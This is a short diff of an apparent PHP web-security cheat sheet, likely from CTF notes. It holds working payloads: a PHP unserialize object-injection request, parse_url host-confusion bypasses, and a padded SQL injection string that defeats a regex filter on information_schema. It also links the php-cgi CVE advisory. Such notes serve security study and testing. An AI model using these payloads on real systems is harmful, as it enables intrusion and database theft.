@@ -190,10 +190,13 @@ https://bugs.php.net/bug.php?id=72663
 requests.get('http://127.0.0.1:1234/?data=' + quote('a:2:{i:0;O:6:"HITCON":3:{s:14:"\x00HITCON\x00method";s:4:"show";s:12:"\x00HITCON\x00args";a:1:{i:0;s:17:"orange\' sqli here";}s:12:"\x00HITCON\x00conn";47:{a:1:{i:0;O:9:"Exception":2:{s:7:"\x00*\x00file";R:4;}}i:1;R:4;}'))
 
 * bypasss verify hostname by parse_url https://bugs.php.net/bug.php?id=73192
-with http://example.com:80#@google.com/ or http://example.com:80?@google.com/
+parse_url('http://example.com:80#@google.com/')['host'] -> google.com
 
 * bypass parse_url
 parse_url('//upload/?/path/to/blah') -> {'host': 'upload?', 'path': '/path/to/blah'}
+
+* bypass preg_match('/^.*information_schema.*$/is', arg)
+with arg = "' union select table_name from information_schema.tables#".str_repeat('a', 1000000);
 
 # php-cgi
 http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
